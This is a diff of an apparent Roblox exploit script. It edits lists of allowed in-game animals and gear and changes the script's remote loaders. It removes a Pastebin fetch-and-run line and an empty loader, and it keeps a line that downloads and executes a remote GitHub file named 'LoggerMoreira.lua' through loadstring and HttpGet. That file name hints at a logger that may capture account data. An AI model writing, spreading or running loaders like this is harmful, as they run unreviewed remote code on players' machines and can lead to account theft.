@@ -61,7 +61,6 @@ getgenv().ALLOWED_ANIMALS = {
 	"Duggy Bros",
 	"Lavadorito Spinito",
 	"Yetimatic",
-	"S’more Serat",
 	"Gold and Diamond",
 	"Spooky and Pumpky",
 	"Boppin Bunny",
@@ -594,11 +593,5 @@ getgenv().ALLOWED_GEARS = {
 	"Phantom Slap"
 }
 task.spawn(function()
-	loadstring(game:HttpGet("https://pastebin.com/m24dfrmm"))()
-end)
-task.spawn(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/krb380529-source/Vonet/refs/heads/main/LoggerMoreira.lua"))()
-end)
-task.spawn(function()
-	loadstring(game:HttpGet(""))()
 end)
